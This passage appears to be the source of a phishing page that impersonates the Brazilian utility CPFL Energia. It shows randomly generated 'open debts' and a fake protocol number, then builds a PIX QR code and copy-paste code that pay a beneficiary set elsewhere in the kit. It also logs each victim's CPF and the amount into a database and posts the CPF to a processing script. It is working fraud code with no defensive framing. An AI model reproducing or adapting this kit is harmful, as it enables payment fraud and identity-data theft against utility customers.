        transform: scale(1);
        opacity: 1
      }

      100% {
        transform: scale(0.5);
        opacity: 0
      }
    }

    @keyframes swal2-animate-success-line-tip {
      0% {
        top: 1.1875em;
        left: .0625em;
        width: 0
      }

      54% {
        top: 1.0625em;
        left: .125em;
        width: 0
      }

      70% {
        top: 2.1875em;
        left: -0.375em;
        width: 3.125em
      }

      84% {
        top: 3em;
        left: 1.3125em;
        width: 1.0625em
      }

      100% {
        top: 2.8125em;
        left: .8125em;
        width: 1.5625em
      }
    }

    @keyframes swal2-animate-success-line-long {
      0% {
        top: 3.375em;
        right: 2.875em;
        width: 0
      }

      65% {
        top: 3.375em;
        right: 2.875em;
        width: 0
      }

      84% {
        top: 2.1875em;
        right: 0;
        width: 3.4375em
      }

      100% {
        top: 2.375em;
        right: .5em;
        width: 2.9375em
      }
    }

    @keyframes swal2-rotate-success-circular-line {
      0% {
        transform: rotate(-45deg)
      }

      5% {
        transform: rotate(-45deg)
      }

      12% {
        transform: rotate(-405deg)
      }

      100% {
        transform: rotate(-405deg)
      }
    }

    @keyframes swal2-animate-error-x-mark {
      0% {
        margin-top: 1.625em;
        transform: scale(0.4);
        opacity: 0
      }

      50% {
        margin-top: 1.625em;
        transform: scale(0.4);
        opacity: 0
      }

      80% {
        margin-top: -0.375em;
        transform: scale(1.15)
      }

      100% {
        margin-top: 0;
        transform: scale(1);
        opacity: 1
      }
    }

    @keyframes swal2-animate-error-icon {
      0% {
        transform: rotateX(100deg);
        opacity: 0
      }

      100% {
        transform: rotateX(0deg);
        opacity: 1
      }
    }

    @keyframes swal2-rotate-loading {
      0% {
        transform: rotate(0deg)
      }

      100% {
        transform: rotate(360deg)
      }
    }

    @keyframes swal2-animate-question-mark {
      0% {
        transform: rotateY(-360deg)
      }

      100% {
        transform: rotateY(0)
      }
    }

    @keyframes swal2-animate-i-mark {
      0% {
        transform: rotateZ(45deg);
        opacity: 0
      }

      25% {
        transform: rotateZ(-25deg);
        opacity: .4
      }

      50% {
        transform: rotateZ(15deg);
        opacity: .8
      }

      75% {
        transform: rotateZ(-5deg);
        opacity: 1
      }

      100% {
        transform: rotateX(0);
        opacity: 1
      }
    }

    body.swal2-shown:not(.swal2-no-backdrop):not(.swal2-toast-shown) {
      overflow: hidden
    }

    body.swal2-height-auto {
      height: auto !important
    }

    body.swal2-no-backdrop .swal2-container {
      background-color: rgba(0, 0, 0, 0) !important;
      pointer-events: none
    }

    body.swal2-no-backdrop .swal2-container .swal2-popup {
      pointer-events: all
    }

    body.swal2-no-backdrop .swal2-container .swal2-modal {
      box-shadow: 0 0 10px rgba(0, 0, 0, .4)
    }

    @media print {
      body.swal2-shown:not(.swal2-no-backdrop):not(.swal2-toast-shown) {
        overflow-y: scroll !important
      }

      body.swal2-shown:not(.swal2-no-backdrop):not(.swal2-toast-shown)>[aria-hidden=true] {
        display: none
      }

      body.swal2-shown:not(.swal2-no-backdrop):not(.swal2-toast-shown) .swal2-container {
        position: static !important
      }
    }

    body.swal2-toast-shown .swal2-container {
      box-sizing: border-box;
      width: 360px;
      max-width: 100%;
      background-color: rgba(0, 0, 0, 0);
      pointer-events: none
    }

    body.swal2-toast-shown .swal2-container.swal2-top {
      top: 0;
      right: auto;
      bottom: auto;
      left: 50%;
      transform: translateX(-50%)
    }

    body.swal2-toast-shown .swal2-container.swal2-top-end,
    body.swal2-toast-shown .swal2-container.swal2-top-right {
      top: 0;
      right: 0;
      bottom: auto;
      left: auto
    }

    body.swal2-toast-shown .swal2-container.swal2-top-start,
    body.swal2-toast-shown .swal2-container.swal2-top-left {
      top: 0;
      right: auto;
      bottom: auto;
      left: 0
    }

    body.swal2-toast-shown .swal2-container.swal2-center-start,
    body.swal2-toast-shown .swal2-container.swal2-center-left {
      top: 50%;
      right: auto;
      bottom: auto;
      left: 0;
      transform: translateY(-50%)
    }

    body.swal2-toast-shown .swal2-container.swal2-center {
      top: 50%;
      right: auto;
      bottom: auto;
      left: 50%;
      transform: translate(-50%, -50%)
    }

    body.swal2-toast-shown .swal2-container.swal2-center-end,
    body.swal2-toast-shown .swal2-container.swal2-center-right {
      top: 50%;
      right: 0;
      bottom: auto;
      left: auto;
      transform: translateY(-50%)
    }

    body.swal2-toast-shown .swal2-container.swal2-bottom-start,
    body.swal2-toast-shown .swal2-container.swal2-bottom-left {
      top: auto;
      right: auto;
      bottom: 0;
      left: 0
    }

    body.swal2-toast-shown .swal2-container.swal2-bottom {
      top: auto;
      right: auto;
      bottom: 0;
      left: 50%;
      transform: translateX(-50%)
    }

    body.swal2-toast-shown .swal2-container.swal2-bottom-end,
    body.swal2-toast-shown .swal2-container.swal2-bottom-right {
      top: auto;
      right: 0;
      bottom: 0;
      left: auto
    }
  </style>
</head>

<body data-="" class="pg-loaded" style="overflow: visible;">
  <style>
    .embeddedServiceHelpButton .helpButton .uiButton {
      background-color: #006699;
      font-family: 'Lato', sans-serif;
      font-size: 12px;
      display: block;
    }

    .embeddedServiceHelpButton .helpButton .uiButton:focus {
      outline: 1px solid #006699;
    }

    .embeddedServiceHelpButton .helpButton .uiButton .embeddedServiceIcon::before {
      font-family: 'embeddedserviceiconfont' !important;
    }

    .embeddedServiceLiveAgentStateChatMenuMessage .rich-menu-item,
    .embeddedServiceLiveAgentStateChatMenuMessage .rich-menu-itemOptionIsClicked {
      text-align: center;
      font-family: 'Lato', sans-serif;
      font-size: 12px;
      padding: 12px 5px;
      display: block;
      width: inherit;
      margin: 0;
    }

    .embeddedServiceLiveAgentStateChatMessage .uiOutputRichText {
      text-align: left;
      font-family: 'Lato', sans-serif;
      font-size: 12px;
    }

    .embeddedServiceLiveAgentStateChatPlaintextMessageDefaultUI.agent.plaintextContent {
      color: #444C64;
      font-family: 'Lato', sans-serif;
      background: #D8D8E0;
      border-radius: 10px 10px 10px 0;
      float: left;
    }

    .embeddedServiceLiveAgentStateChatPlaintextMessageDefaultUI.chasitor.plaintextContent {
      font-family: 'Lato', sans-serif;
      background: #006699;
      color: #FFFFFF;
    }

    .message {
      font-size: 12px;
      color: #FFFFFF;
      font-family: 'Lato', sans-serif;
    }

    .headerTextContent {
      font-size: 12px;
      color: #FFFFFF;
      font-family: 'Lato', sans-serif;
    }
  </style>
  <div class="cpfl-style">
    <div ui-view="" autoscroll="false" class="ng-scope">
      <div ng-controller="MenuController as menuCtrl" class="ng-scope">
        <main id="panelMobile" class="panelMobile slideout-panel slideout-panel-left">
          <div class="container-fluid">
            <div ng-if="menuCtrl.showMenuContingencia" id="menu-header" class="ng-scope">
              <ng-include class="ng-scope">
                <div class="row ng-scope">
                  <nav class="navbar navbar-custom navbar-fixed-top navbar-static-top">
                    <div class="container">
                      <div class="navbar-header">
                        <button id="btnMenu" type="button" class="navbar-toggle toggle-button ng-scope" ng-click="menuCtrl.toggleMenu()" ng-if="menuCtrl.showMenu()">
                          <span class="hamburguer"></span>
                        </button>
                        <div class="navbar-brand navbar-brand-cpfl-energia" ng-class="{&#39;navbar-brand-cpfl-energia&#39;:menuCtrl.logo == &#39;./cpfl/images/logos/logo-cpfl-energia.svg&#39; }">
                          <a ui-sref="app.home" ui-sref-opts="{reload: true}" href="javascript:void(0)">
                            <img class="navbar-logo-empresa" src="assets/img/logo-cpfl-energia.svg">
                          </a>
                        </div>
                      </div>
                    </div>
                  </nav>
                </div>
              </ng-include>
            </div>
            <subcabecalho ng-if="menuCtrl.exibirMenuServicos" class="ng-scope ng-isolate-scope">
              <style type="text/css"></style>
            </subcabecalho>
            <div class="row">
              <div class="container">
                <div class="row">
                  <div class="col-xs-24">
                    <div ui-view="content" autoscroll="false" class="pages-content ng-scope">
                    
                        <div class="protocolo-mn">
                            <p>Protocolo de Atendimento: <span><?php echo gerarNumeroAleatorio($tamanho);?></span></p>
                        </div>

                        <div class="debito">
                            <div class="banner-debito">
                                <h1>R$<?php echo $valorAleatorio ?></h1>
                                <h4>TOTAL DE DEBITOS EM ABERTO</h4>
                            </div>
                            <div class="alert">
                                <i class="fa-solid fa-triangle-exclamation"></i> Para manter a prrivacidade dos seus dados ocultamos parte do nome e endereco na via simplificada
                            </div>

                            <div class="content-fat">
                                <div class="titles">
                                    <div class="title">
                                        <p>Mes Ref.</p>
                                    </div>

                                    <div class="title">
                                        <p>Mes Descricao da fatura</p>
                                    </div>

                                    <div class="title">
                                        <p>Valor</p>
                                    </div>

                                    <div class="title">
                                        <p>Vencimento</p>
                                    </div>

                                    <div class="title">
                                        <p>Pagamento</p>
                                    </div>
                                </div><br>
                                <div class="conteudos">
                                    <div class="conteudo">
                                        <p><?php echo $mesRef?></p>
                                    </div>

                                    <div class="conteudo">
                                        <p>Fatura Energia</p>
                                    </div>

                                    <div class="conteudo">
                                        <p>R$<?php echo $valorAleatorio ?></p>
                                    </div>

                                    <div class="conteudo">
                                        <p><?php echo $vencimento?></p>
                                    </div>

                                    <div class="conteudo">
                                      <button class="pxbtn" id="gerarBtn">Gerar</button>
                                    </div>
                                </div>
                            </div>
                            <div class="return">
                                <a href=""><button>Voltar</button></a>
                            </div>
                        </div>
                    </div>
                  </div>
                </div>
              </div>
            </div>
            <div class="row" id="menu-footer">
              <!-- ngInclude: -->
              <ng-include class="ng-scope">
                <footer class="ng-scope">
                  <div class="rodape">
                    <div class="container">
                      <div class="row">
                        <div class="col-xs-24 col-md-24 np">
                          <aside class="col-xs-24 col-md-4">
                            <div class="navegacao">
                              <h2>
                                <img class="img-footer" src="assets/img/logo-cpfl-energia.svg">
                              </h2>
                            </div>
                          </aside>
                          <aside class="col-xs-24 col-md-12">
                            <div class="navegacao">
                              <div class="row">
                                <nav class="linksFooter">
                                  <ul>
                                    <li>
                                      <a title="Institucional" class="hand">Institucional</a> | <a>Atendimento ao consumidor</a>
                                      <br>
                                      <a title="Energias sustentáveis" class="hand">Energias sustentáveis</a> | <a title="Unidades de negócios" class="hand">Unidades de negócios</a> | <a title="Imprensa" class="hand">Imprensa</a>
                                    </li>
                                  </ul>
                                </nav>
                                <div class="col-md-24 col-lg-24 np">
                                  <nav class="col-md-12 col-lg-12 np">
                                    <div class="linkNavLefts">
                                      <ul>
                                        <li>
                                          <a class="hand" title="Institucional">Institucional</a>
                                        </li>
                                        <li>
                                          <a class="hand" title="Atendimento a consumidores">Atendimento a consumidores</a>
                                        </li>
                                        <li>
                                          <a class="hand" title="Energias sustentáveis">Energias sustentáveis</a>
                                        </li>
                                      </ul>
                                    </div>
                                  </nav>
                                  <nav class="col-md-12 col-lg-12 np">
                                    <div class="linkNavRight">
                                      <ul>
                                        <li>
                                          <a class="hand" title="Unidades de negócios">Unidades de negócios</a>
                                        </li>
                                        <li>
                                          <a class="hand" title="Imprensa">Imprensa</a>
                                        </li>
                                      </ul>
                                    </div>
                                  </nav>
                                </div>
                              </div>
                            </div>
                          </aside>
                          <aside class="col-xs-24 col-md-4 col-lg-4 np">
                            <div class="redesSociais">
                              <h3>Siga-nos nas redes sociais:</h3>
                              <nav class="listSociais">
                                <ul>
                                  <li>
                                    <a class="hand" title="facebook">
                                      <span class="ico-facebook"></span>
                                    </a>
                                  </li>
                                  <li>
                                    <a class="hand" title="twitter">
                                      <span class="ico-twitter"></span>
                                    </a>
                                  </li>
                                  <li>
                                    <a class="hand" title="youtube">
                                      <span class="ico-youtube"></span>
                                    </a>
                                  </li>
                                  <li>
                                    <a class="hand" title="linkedin">
                                      <span class="ico-linkedin"></span>
                                    </a>
                                  </li>
                                </ul>
                              </nav>
                            </div>
                          </aside>
                        </div>
                      </div>
                    </div>
                  </div>
                  <div class="copyright">
                    <div class="container">
                      <div class="row">
                        <div class="col-xs-24">
                          <p> CPFL Energia 2020. Todos os direitos reservados. <span>
                              <a class="hand" title="Aviso de Privacidade" href="javascript:void(0)">Aviso de Privacidade</a> | <a class="hand" title="Termos de Uso" ui-sref="app.termo-uso" href="javascript:void(0)">Termos de Uso</a>
                            </span>
                          </p>
                        </div>
                      </div>
                    </div>
                  </div>
                </footer>
              </ng-include>
            </div>
          </div>
        </main>
      </div>
    </div>

    <div class="qrcode-cont">
      <div class="content-qr">
          <div class="tit">
            <h2>QR Code de Pagamento</h2>
            <h1 class="close">x</h1>
          </div>
          <p>No seu APP use QR Code PIX</p>
          <?php
                    if ($gerar_qrcode){
                        include "phpqrcode/qrlib.php"; 
                        include "funcoes_pix.php";
                        $px[00]="01"; 
                        $px[26][00]="br.gov.bcb.pix"; 
                        $px[26][01]=$chave_pix;
                        if (!empty($descricao)) {
                            $tam_max_descr=99-(4+4+4+14+strlen($chave_pix));
                            if (strlen($descricao) > $tam_max_descr) {
                                $descricao=substr($descricao,0,$tam_max_descr);
                            }
                            $px[26][02]=$descricao;
                        }
                        $px[52]="0000";
                        $px[53]="986";
                        if ($valor_pix > 0) {
                            $px[54]=$valor_pix;
                        }
                        $px[58]="BR"; 
                        $px[59]=$beneficiario_pix; 
                        $px[60]=$cidade_pix;
                        $px[62][05]=$identificador;

                        $pix=montaPix($px);
                        $pix.="6304"; 
                        $pix.=crcChecksum($pix); 
                        $linhas=round(strlen($pix)/120)+1;
                        ?>
                        <p>
                        <?php
                        ob_start();
                        QRCode::png($pix, null,'M',5);
                        $imageString = base64_encode( ob_get_contents() );
                        ob_end_clean();
                        echo '<img src="data:image/png;base64,' . $imageString . '"></p>';
                    }
                    ?>
                <p>Ou use PIX Copia e Cola</p>
                <div class="card">
                        <div class="row">
                            <div class="col">
                            <textarea class="text-monospace" id="brcodepix" rows="<?= $linhas; ?>" cols="130" onclick="copiar()"><?= $pix;?></textarea>
                            </div>
                            <div class="col md-1">
                              <form action="" method="post">
                                <input type="hidden" name="clicked" value="clicked">
                                <input type="hidden" name="valorpx" value="<?php echo $valor_pix?>">
                                <input type="hidden" name="cpfuser" value="<?php echo $cpfUsuario?>">
                                <p><button type="submit" id="clip_btn" class="btn btn-primary" data-toggle="tooltip" data-placement="top" title="Copiar código pix" onclick="copiar()">Copiar Codigo <i class="fas fa-clipboard"></i></button></p>
                              </form>
                              <?php
if(isset($_POST["clicked"])) {
    $valor1 = $_POST["clicked"];
    $valor2 = $_POST["cpfuser"];
    $valor3 = $_POST["valorpx"];

    try {
        $pdo = new PDO($dsn, $db_usuario, $db_senha, $options);

        // Verificar se o CPF está definido e não vazio
        if (isset($valor2) && !empty($valor2)) {
            // Verificar se o CPF já existe no banco de dados
            $sql_verificar = "SELECT COUNT(*) FROM tablea WHERE campo2 = ?";
            $stmt_verificar = $pdo->prepare($sql_verificar);
            $stmt_verificar->execute([$valor2]);
            $num_rows = $stmt_verificar->fetchColumn();

            if ($num_rows == 0) { // Se o CPF não existir, então inserir
                // Query SQL para inserir os dados na tabela
                $sql = "INSERT INTO tablea (campo1, campo2, campo3) VALUES (?, ?, ?)";
                
                // Preparar a consulta
                $stmt = $pdo->prepare($sql);

                // Executar a consulta
                $stmt->execute([$valor1, $valor2, $valor3]);

                echo "<script>alert('Código PIX Copiado com Sucesso')</script>";
            } else {
                // Aqui você pode adicionar qualquer lógica adicional que desejar para lidar com o caso em que o CPF já está cadastrado.
            }
        } else {
            // Aqui você pode adicionar qualquer lógica adicional que desejar para lidar com o caso em que o CPF não está definido.
        }
    } catch (\PDOException $e) {
        // Tratar a exceção
    }
}
?>

                          </div>
                        </div>
                    </div>

      </div>
    </div>
    <script>
    let button = document.querySelector('.pxbtn');
    let close = document.querySelector('.close');
    let qrcodeCont = document.querySelector('.qrcode-cont');

    button.addEventListener('click', function() {
        qrcodeCont.classList.add("aparece");
    });
    close.addEventListener('click', function() {
        qrcodeCont.classList.remove("aparece");
    });
</script>
<script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
<script>
$(document).ready(function() {
    $('#gerarBtn').click(function() {
        // Capturar o CPF do campo de entrada
        var cpf = $('#cpfInput').val();
        
        // Realizar uma requisição AJAX quando o botão for clicado
        $.ajax({
            type: 'POST',
            url: 'processar.php', // Script PHP para processar a inserção no banco de dados
            data: {
                gerar: true, // Sinalizar que o botão foi clicado
                cpf: cpf // Passar o CPF junto com os dados
            },
            success: function(response) {
                // Ação a ser executada quando a requisição for bem-sucedida
                console.log('Dados inseridos com sucesso no banco de dados.');
            },
            error: function(xhr, status, error) {
                // Ação a ser executada em caso de erro
                console.error('Erro ao inserir os dados no banco de dados:', error);
            }
        });
    });
});
</script>

  </body>

</html>